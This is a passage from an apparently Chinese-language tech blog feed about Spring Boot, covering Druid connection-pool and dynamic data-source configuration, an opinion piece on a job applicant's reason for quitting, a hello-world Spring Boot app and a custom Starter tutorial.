title="连接池配置类"></a>连接池配置类</h2><p>Druid连接池的自动配置类：</p><pre class="line-numbers language-none"><code class="language-none">@Configuration@Import(&#123; PropertiesConfig.class &#125;)@ConditionalOnClass(DruidDataSource.class)@ConditionalOnProperty(prefix &#x3D; DSConfig.DS_PREFIX, value &#x3D; DSConfig.DS_ACTIVE, havingValue &#x3D; DSConfig.DRUID)public class DruidAutoConfig implements DSConfig &#123;private Logger logger &#x3D; LoggerUtils.getLogger(this);@Bean(name &#x3D; DB_MASTER, initMethod &#x3D; &quot;init&quot;, destroyMethod &#x3D; &quot;close&quot;)public DataSource dataSourceMaster(DruidMasterProperties masterProperties) throws SQLException &#123;logger.debug(&quot;master properties: &#123;&#125;&quot;, masterProperties.toString());DruidDataSource dds &#x3D; new DruidDataSource();dds.setDriverClassName(masterProperties.getDriverClassName());dds.setUrl(masterProperties.getUrl());dds.setUsername(masterProperties.getUsername());dds.setPassword(masterProperties.getPassword());dds.setInitialSize(masterProperties.getInitialSize());dds.setMinIdle(masterProperties.getMinIdle());dds.setMaxActive(masterProperties.getMaxActive());dds.setMaxWait(masterProperties.getMaxWait());dds.setTimeBetweenEvictionRunsMillis(masterProperties.getTimeBetweenEvictionRunsMillis());dds.setMinEvictableIdleTimeMillis(masterProperties.getMinEvictableIdleTimeMillis());dds.setValidationQuery(masterProperties.getValidationQuery());dds.setTestOnBorrow(masterProperties.isTestOnBorrow());dds.setTestWhileIdle(masterProperties.isTestWhileIdle());dds.setTestOnReturn(masterProperties.isTestOnReturn());dds.setPoolPreparedStatements(masterProperties.isPoolPreparedStatements());dds.setMaxPoolPreparedStatementPerConnectionSize(masterProperties.getMaxPoolPreparedStatementPerConnectionSize());dds.setFilters(masterProperties.getFilters());return dds;&#125;@Bean(name &#x3D; DB_SLAVE, initMethod &#x3D; &quot;init&quot;, destroyMethod &#x3D; &quot;close&quot;)public DataSource dataSourceSlave(DruidSlaveProperties slaveProperties) throws SQLException &#123;logger.debug(&quot;slave properties: &#123;&#125;&quot;, slaveProperties.toString());DruidDataSource dds &#x3D; new DruidDataSource();dds.setDriverClassName(slaveProperties.getDriverClassName());dds.setUrl(slaveProperties.getUrl());dds.setUsername(slaveProperties.getUsername());dds.setPassword(slaveProperties.getPassword());dds.setInitialSize(slaveProperties.getInitialSize());dds.setMinIdle(slaveProperties.getMinIdle());dds.setMaxActive(slaveProperties.getMaxActive());dds.setMaxWait(slaveProperties.getMaxWait());dds.setTimeBetweenEvictionRunsMillis(slaveProperties.getTimeBetweenEvictionRunsMillis());dds.setMinEvictableIdleTimeMillis(slaveProperties.getMinEvictableIdleTimeMillis());dds.setValidationQuery(slaveProperties.getValidationQuery());dds.setTestOnBorrow(slaveProperties.isTestOnBorrow());dds.setTestWhileIdle(slaveProperties.isTestWhileIdle());dds.setTestOnReturn(slaveProperties.isTestOnReturn());dds.setPoolPreparedStatements(slaveProperties.isPoolPreparedStatements());dds.setMaxPoolPreparedStatementPerConnectionSize(slaveProperties.getMaxPoolPreparedStatementPerConnectionSize());dds.setFilters(slaveProperties.getFilters());return dds;&#125;@Beanpublic ServletRegistrationBean druidServletRegistrationBean(EnvConfig env) &#123;String username &#x3D; env.getStringValue(DSConfig.DRUID_MONITOR_USERNAME);String password &#x3D; env.getStringValue(DSConfig.DRUID_MONITOR_PASSWORD);return new ServletRegistrationBean(new DruidStatViewServlet(username, password),DSConfig.DRUID_MONITOR_URL);&#125;@Beanpublic FilterRegistrationBean druidFilterRegistrationBean() &#123;WebStatFilter wsf &#x3D; new WebStatFilter();FilterRegistrationBean filterRegistrationBean &#x3D; new FilterRegistrationBean();filterRegistrationBean.setFilter(wsf);filterRegistrationBean.setUrlPatterns(Arrays.asList(DSConfig.DRUID_FILTER_URL));filterRegistrationBean.setInitParameters(Collections.singletonMap(&quot;exclusions&quot;, DSConfig.DRUID_FILTER_EXCLUSIONS));return filterRegistrationBean;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据类路径下有DruidDataSource这个类即有Druid这个jar包和配置文件中spring.datasource.active&#x3D;druid才开启对Druid连接池的自动配置。</p><p>导入的配置文件：</p><pre class="line-numbers language-none"><code class="language-none">@Configuration@ComponentScan(basePackages &#x3D; &quot;com.example.common.config.properties&quot;)public class PropertiesConfig &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DruidMasterProperties、DruidSlaveProperties属性文件读取的配置省略。</p><p>连接池监控配置类：</p><pre class="line-numbers language-none"><code class="language-none">public class DruidStatViewServlet extends StatViewServlet &#123;private static final long serialVersionUID &#x3D; 1L;private String username;private String password;@Overridepublic String getInitParameter(String name) &#123;if (&quot;loginUsername&quot;.equals(name)) &#123;return username;&#125;if (&quot;loginPassword&quot;.equals(name)) &#123;return password;&#125;return super.getInitParameter(name);&#125;public DruidStatViewServlet(String username, String password) &#123;super();this.username &#x3D; username;this.password &#x3D; password;&#125;public String getUsername() &#123;return username;&#125;public String getPassword() &#123;return password;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在META-INF&#x2F;spring.factories中加入Druid自动配置映射：</p><pre class="line-numbers language-none"><code class="language-none">org.springframework.boot.autoconfigure.EnableAutoConfiguration&#x3D;\com.example.common.config.ds.DruidAutoConfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="切换数据源"><a href="#切换数据源" class="headerlink" title="切换数据源"></a>切换数据源</h2><p>切换数据源注解：</p><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface DS &#123;String value() default DSConfig.DB_MASTER;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>动态数据源类：</p><pre class="line-numbers language-none"><code class="language-none">public class DynamicDataSource extends AbstractRoutingDataSource &#123;private final Logger logger &#x3D; LoggerUtils.getLogger(this);@Overrideprotected Object determineCurrentLookupKey() &#123;logger.debug(&quot;当前数据源为&#123;&#125;&quot;, DataSourceContextHolder.getDS());return DataSourceContextHolder.getDS();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>动态数据源AOP实现类：</p><pre class="line-numbers language-none"><code class="language-none">@Aspect@Componentpublic class DynamicDataSourceAspect &#123;@Before(&quot;@annotation(DS)&quot;)public void beforeSwitchDS(JoinPoint point) &#123;Class&lt;?&gt; className &#x3D; point.getTarget().getClass();String methodName &#x3D; point.getSignature().getName();Class&lt;?&gt;[] argClass &#x3D; ((MethodSignature) point.getSignature()).getParameterTypes();String dataSource &#x3D; DataSourceContextHolder.DEFAULT_DS;try &#123;Method method &#x3D; className.getMethod(methodName, argClass);if (method.isAnnotationPresent(DS.class)) &#123;DS annotation &#x3D; method.getAnnotation(DS.class);dataSource &#x3D; annotation.value();&#125;&#125; catch (Exception e) &#123;e.printStackTrace();&#125;DataSourceContextHolder.setDS(dataSource);&#125;@After(&quot;@annotation(DS)&quot;)public void afterSwitchDS(JoinPoint point) &#123;DataSourceContextHolder.clearDS();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>绑定当前线程数据源类：</p><pre class="line-numbers language-none"><code class="language-none">public class DataSourceContextHolder &#123;public static final String DEFAULT_DS &#x3D; DSConfig.DB_MASTER;private static final ThreadLocal&lt;String&gt; DS_HOLDER &#x3D; new ThreadLocal&lt;&gt;();public static void setDS(String dbType) &#123;DS_HOLDER.set(dbType);&#125;public static String getDS() &#123;return (DS_HOLDER.get());&#125;public static void clearDS() &#123;DS_HOLDER.remove();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公司不用 Spring Boot，果断离职了！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/%E5%85%AC%E5%8F%B8%E4%B8%8D%E7%94%A8%20Spring%20Boot%EF%BC%8C%E6%9E%9C%E6%96%AD%E7%A6%BB%E8%81%8C%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/%E5%85%AC%E5%8F%B8%E4%B8%8D%E7%94%A8%20Spring%20Boot%EF%BC%8C%E6%9E%9C%E6%96%AD%E7%A6%BB%E8%81%8C%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/pexels-photo-2422896.jpeg"></p><p>面试问到离职原因，我想这是很多面试者的痛，包括我自己，曾经也被离职原因所坑过。</p><p>](<a href="https://mp.weixin.qq.com/s/7g4s8uXz1ZpVuyjCu3jcoQ)%E3%80%8B%EF%BC%8C%E5%B8%8C%E6%9C%9B%E5%8F%AF%E4%BB%A5%E7%BB%99%E8%81%8C%E5%9C%BA%E5%B0%8F%E7%99%BD%E4%B8%80%E7%82%B9%E7%82%B9%E7%BB%8F%E9%AA%8C%EF%BC%8C%E5%B0%91%E8%B5%B0%E5%BC%AF%E8%B7%AF%E3%80%82">https://mp.weixin.qq.com/s/7g4s8uXz1ZpVuyjCu3jcoQ)》，希望可以给职场小白一点点经验，少走弯路。</a></p><p>话说最近栈长面试了个两三年的 Java 开发程序员，离职原因说出来就是砸自己的脚，真是感慨万千啊，且听我慢慢道来。</p><p>我让他做个简单的自我介绍，叽里咕噜一大堆，持续好些分钟，我实在没耐心听下去了，但也不好强行打断，中间趁他换气还是插了句话让他停止自我介绍了。</p><p>从头到尾表现出一股很强烈的学习欲望，说他很爱好学习，平时还自建 Demo 学习 Spring Boot、Spring Cloud 相关技术什么的。然而，当我问到一些相关的知识点时，又吱吱唔唔了。</p><p>最有意思的是，居然主动说了离职原因，他说公司项目没用 Spring Boot，他觉得 Spring Boot 又是最主流的技术，果断离职出来找个用这个技术的公司学习一下。</p><p><img src="http://img.javastack.cn/pexels-photo-1298601.jpeg"></p><p>这离职原因说出来让我有点想笑，站在面试官的角度，他表现的非常热爱技术和强烈的学习欲望是好事，但确实是好事吗？就因为公司没用 Spring Boot 就要离职么？我从中看出面试者的非常不稳定性。</p><p>或者我可以理解，哪天出来一个新技术，我司因为业务过于复杂难，难度和风险都非常大，不能迁移到新技术，他是不是也要离职去新技术的公司呢？</p><p>举个例子吧，虽然 Struts 漏洞非常多，大家都在用 Spring 全家桶那一套，但我肯打赌，还是有公司在不停的打补丁持续用 Struts 的，没办法，升级的成本太高，代价太大，虽然公司也想尽快换掉，可又非常困难。</p><p>公司都是要赚钱的，技术上必须求稳，不是什么新技术出来都会马上运用到，可能有个转变周期，又可能是核心业务过于保守，不敢乱动，贸然使用新技术可能还会给公司带来灭顶之灾。</p><p>技术都是为业务服务的，牛逼的技术也得服务牛逼的业务，杀个鸡不要用牛刀吧？只有最合适的就是最好的，能把一项技术用到极致就是牛逼，而不是追求最新。现在技术发展飞快，更是互联网的不断发展和需求的不断变更迭代，才有更多新技术的出现。</p><p><img src="http://img.javastack.cn/pexels-photo-2398220.jpeg"></p><p>另外，技术再牛逼，如果没人用，没合适的落地场景，也难以持续。就像现在的“区块链”，不知道现在还有多少人要吵着学区块链，技术虽好，但缺少合适的落地应用场景，很多公司也只是是为了运用区块链而运用，没意义，就像一个单体应用足以支撑的小公司运用微服务一样的道理，但这确实是技术的发展趋势，或者是不想错过这个风口吧。</p><p>话又说回来，离职原因千万不要乱说，即使这是你的真实想法，但却不是最佳的回答，说不好还会前功尽弃。</p><p>最好说一点，Spring Boot虽然开发极简极快，但附带的东西太多，对于那些轻量级主义开发者可能并不觉得它是个好项目，也许 JFinal、Spring MVC 是他更好的选择，这就仁者见仁智者见智了。</p><p>对于离职原因或者新技术，你有什么看法，欢迎留言。</p><p>最后祝大家周末愉快，明天见~</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>年轻人的第一个 Spring Boot 应用，太爽了！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%20Spring%20Boot%20%E5%BA%94%E7%94%A8%EF%BC%8C%E5%A4%AA%E7%88%BD%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%20Spring%20Boot%20%E5%BA%94%E7%94%A8%EF%BC%8C%E5%A4%AA%E7%88%BD%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot 大家都知道是啥吧？</p><p>还有不知道的来看这篇扫下盲：<a href="https://mp.weixin.qq.com/s/jsvvBQYs6DKBEFo3Qz3YDA">告诉你，Spring Boot 真是个牛逼货！</a>。</p><p>顺便再往下看，栈长给你带来年轻人的第一个 Spring Boot 应用，撸码史无前例的轻松，那就一个字：爽！</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>打开这个网站，快速生成一个 Spring Boot 项目。</p><blockquote><p><a href="https://start.spring.io/">https://start.spring.io/</a></p></blockquote><p>废话不说，看下图，几秒搞定！</p><p><img src="http://img.javastack.cn/init.gif"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>解压生成的 demo 项目，导入到 IDE 中。</p><p><img src="http://img.javastack.cn/20190528173103.png"></p><p>来看下 <code>pom.xml</code> 文件内容：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt;&lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;&lt;version&gt;2.1.5.RELEASE&lt;&#x2F;version&gt;&lt;relativePath&#x2F;&gt; <!-- lookup parent from repository -->&lt;&#x2F;parent&gt;&lt;groupId&gt;cn.javastack&lt;&#x2F;groupId&gt;&lt;artifactId&gt;demo&lt;&#x2F;artifactId&gt;&lt;version&gt;0.0.1-SNAPSHOT&lt;&#x2F;version&gt;&lt;name&gt;demo&lt;&#x2F;name&gt;&lt;description&gt;Demo project for Spring Boot&lt;&#x2F;description&gt;&lt;properties&gt;&lt;java.version&gt;1.8&lt;&#x2F;java.version&gt;&lt;&#x2F;properties&gt;&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-web&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-test&lt;&#x2F;artifactId&gt;&lt;scope&gt;test&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;&lt;build&gt;&lt;plugins&gt;&lt;plugin&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;&lt;&#x2F;plugin&gt;&lt;&#x2F;plugins&gt;&lt;&#x2F;build&gt;&lt;&#x2F;project&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以及 <code>DemoApplication</code> 入口类内容：</p><pre class="line-numbers language-none"><code class="language-none">@SpringBootApplicationpublic class DemoApplication &#123;    public static void main(String[] args) &#123;        SpringApplication.run(DemoApplication.class, args);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>添加年轻人的第一个 Spring Boot 请求：&#x2F;hello.</p><p>修改 <code>DemoApplication</code> 添加一个请求方法，修改后的代码内容如下：</p><pre class="line-numbers language-none"><code class="language-none">@RestController@SpringBootApplicationpublic class DemoApplication &#123;    public static void main(String[] args) &#123;        SpringApplication.run(DemoApplication.class, args);    &#125;    @GetMapping(&quot;&#x2F;hello&quot;)    public String hello() &#123;        return &quot;hello&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>运行 Spring Boot 应用，在 IDE 中运行 <code>DemoApplication</code> main 方法即可。当然，运行 Spring Boot 还有很多方式，参考：<a href="https://mp.weixin.qq.com/s/lZsQnvlR38TLuV--D3F7Ag">运行 Spring Boot 应用的 3 种方式！</a>。</p><p><img src="http://img.javastack.cn/20190528173441.png"></p><p>如图所示，程序已经启动，牛逼啊，2秒多就启动起来了，爽。。。它能跑起来，是因为内置了 Tomcat 容器，当然你也可以替换或者自定义配置，参考：<a href="https://mp.weixin.qq.com/s/aEghlvBHE9rpfsAjiq1Kfw">Spring Boot Server容器配置</a>。</p><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h2><p>访问 &#x2F;hello 请求，在浏览器中访问以下链接：</p><blockquote><p><a href="http://localhost:8080/hello">http://localhost:8080/hello</a></p></blockquote><p><img src="http://img.javastack.cn/20190528164756.png"></p><p>如下图所示，页面输出了hello.</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我就在官网生成一个 demo 项目，然后导入到 IDE 中，写几行代码后输出：hello，开启了年轻人的第一个 Spring Boot 项目。</p><p>全程下来，我就只用几分钟，然后只加了 5 行代码，没有其他乱七八糟的 XML 配置，这叫一个爽。</p><p>Spring Boot我已经写了一大堆教程了，都是最新的实战干货，关注微信公众号，在后台回复：”boot”，即可获取，以下仅为部分预览。</p><ul><li>Spring Boot 读取配置的几种方式</li><li>Spring Boot 如何做参数校验？</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 2.x 新特性总结及迁移指南</li><li>……</li></ul><p>栈长将继续第一时间在公众号推送 Spring Boot 最新进展及热门技术教程。最后，大家用的哪个版本呢？欢迎留言~</p><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>年轻人的第一个自定义 Spring Boot Starter！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%87%AA%E5%AE%9A%E4%B9%89%20Spring%20Boot%20Starter%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%87%AA%E5%AE%9A%E4%B9%89%20Spring%20Boot%20Starter%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>陆陆续续，零零散散，栈长已经写了几十篇 Spring Boot 系列文章了，其中有介绍到 <a href="https://mp.weixin.qq.com/s/9HJVGlplze5p0eBayvhFCA">Spring Boot Starters 启动器</a>，使用的、介绍的都是第三方的 Starters ，那如何开发一个自己的 Spring Boot Starter 呢？</p><p>下面带大家开发一个年轻人的第一个 Spring Boot Starter！</p><p>不知道 Starters 为何物的请进这个传送门&#x3D;&#x3D;&#x3D;&gt;<br><a href="https://mp.weixin.qq.com/s/9HJVGlplze5p0eBayvhFCA">Spring Boot Starters 启动器</a>，看完有了学习基础，我们再继续下面的自定义 Starter 实战！</p><h2 id="一、自定义-Starter-必备组件"><a href="#一、自定义-Starter-必备组件" class="headerlink" title="一、自定义 Starter 必备组件"></a>一、自定义 Starter 必备组件</h2><p>一个完整的 Spring Boot Starter 需要包含以下组件：</p><ul><li>包含自动配置代码的自动配置模块；参考：<a href="https://mp.weixin.qq.com/s/gs2zLSH6m9ijO0-pP2sr9Q">Spring Boot自动配置原理、实战</a>。</li><li>Starter模块提供对自动模块的依赖关系，和相关依赖库，以及任何需要用到的依赖。简而言之，就是，添加一个 Starter 就应该提供使用该 Starter 所需的一切；</li></ul><h2 id="二、创建一个自定义Starter"><a href="#二、创建一个自定义Starter" class="headerlink" title="二、创建一个自定义Starter"></a>二、创建一个自定义Starter</h2><p>怎么创建 Spring Boot 项目就不说了，之前也分享过，参考：<a href="https://mp.weixin.qq.com/s/YNhoFtcvGuoY24fVQCPdmg">年轻人的第一个 Spring Boot 应用！</a>。</p><p>这个自定义 Starter 就实现一个根据属性的值是否配置Bean。</p><h4 id="1、创建自动配置类"><a href="#1、创建自动配置类" class="headerlink" title="1、创建自动配置类"></a>1、创建自动配置类</h4><pre class="line-numbers language-none"><code class="language-none">package cn.javastack.springboot.starter.config;import cn.javastack.springboot.starter.service.TestService;import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configuration@ConditionalOnProperty(prefix &#x3D; &quot;javastack.starter&quot;, name &#x3D; &quot;enabled&quot;, havingValue &#x3D; &quot;true&quot;)public class TestServiceAutoConfiguration &#123;    @Bean    public TestService testService() &#123;        return new TestService();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个自动配置类很简单，就是根据是否有 <code>javastack.starter.enabled=true</code> 这个参数的值再配置一个Bean。 </p><p><code>TestService</code>示例如下：</p><pre class="line-numbers language-none"><code class="language-none">package cn.javastack.springboot.starter.service;public class TestService &#123;    public String getServiceName() &#123;        return &quot;Java&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、允许自动配置"><a href="#2、允许自动配置" class="headerlink" title="2、允许自动配置"></a>2、允许自动配置</h4><p>创建 <code>META-INF/spring.factories</code> 文件，添加这个允许自动配置的类。</p><pre class="line-numbers language-none"><code class="language-none">org.springframework.boot.autoconfigure.EnableAutoConfiguration&#x3D;\cn.javastack.springboot.starter.config.TestServiceAutoConfiguration<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="三、测试这个自定义Starter"><a href="#三、测试这个自定义Starter" class="headerlink" title="三、测试这个自定义Starter"></a>三、测试这个自定义Starter</h2><p>上面的自定义 Starter 项目建好后，可以来测试一下它是否生效了。</p><p>一般是把它打成 jar 包上传到 Maven 仓库，供其他同事调用，这里我们本报打完包之后再引用它。</p><h4 id="1、添加依赖"><a href="#1、添加依赖" class="headerlink" title="1、添加依赖"></a>1、添加依赖</h4><p>新建一个 Spring Boot 测试项目，添加这个自定义 Starter 依赖，Maven 依赖如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;cn.javastack&lt;&#x2F;groupId&gt;        &lt;artifactId&gt;javastack-spring-boot-starter&lt;&#x2F;artifactId&gt;        &lt;version&gt;1.0&lt;&#x2F;version&gt;        &lt;scope&gt;compile&lt;&#x2F;scope&gt;    &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、添加测试方法"><a href="#2、添加测试方法" class="headerlink" title="2、添加测试方法"></a>2、添加测试方法</h4><pre class="line-numbers language-none"><code class="language-none">package cn.javastack.springboot.starter.sample;import cn.javastack.springboot.starter.service.TestService;import org.springframework.boot.CommandLineRunner;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.context.annotation.Bean;&#x2F;** *  *&#x2F;@SpringBootApplicationpublic class Application &#123;    public static void main(String[] args) &#123;        SpringApplication.run(Application.class);    &#125;    @Bean    public CommandLineRunner commandLineRunner(TestService testService) &#123;        return (args) -&gt; &#123;            System.out.println(testService.getServiceName());        &#125;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个方法的作用是，项目启动后，调用 <code>TestService</code> 的实例方法，输出方法的值。</p><p>关于 <code>CommandLineRunner</code> 有不懂的可以看这篇文章：<a href="https://mp.weixin.qq.com/s/WeO2kJLV6LKez56T5GG35Q">Spring Boot Runner 启动器</a>。</p><h4 id="3、开启配置"><a href="#3、开启配置" class="headerlink" title="3、开启配置"></a>3、开启配置</h4><p>我们知道这个自定义 Starter 中需要有 <code>javastack.starter.enabled=true</code> 这个参数的值的，所以我们在 <code>application.yml</code> 配置文件中添加这个配置：</p><pre class="line-numbers language-none"><code class="language-none">javastack:  starter:    enabled: true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="4、运行测试"><a href="#4、运行测试" class="headerlink" title="4、运行测试"></a>4、运行测试</h4><p>运行 Application 类的 main 方法，最后会输出结果：Java。</p><p>当我们把配置改为：</p><pre class="line-numbers language-none"><code class="language-none">javastack:  starter:    enabled: false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时，运行报错，因为没有这个实例啊，自动配置类只有为 true 时才会配置。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>本章栈长简单演示了如何自定义一个 Spring Boot Starter，根据某个参数的值来决定是否自动配置，其实还可以根据是否有某个类、某个Bean……等，可以看下《<a href="https://mp.weixin.qq.com/s/lOA9djEptJyZ2sm93nxr-Q">Spring Boot 最核心的 25 个注解</a>》这篇文章对应的 <code>ConditionOnXXX</code> 系列注解。</p><p>其实了解了 Spring Boot 自动配置的原理，自定义一个 Starter 并不难，你可以在这个实例基础上灵活扩展。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud @RefreshScope 原理是什么？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20@RefreshScope%20%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
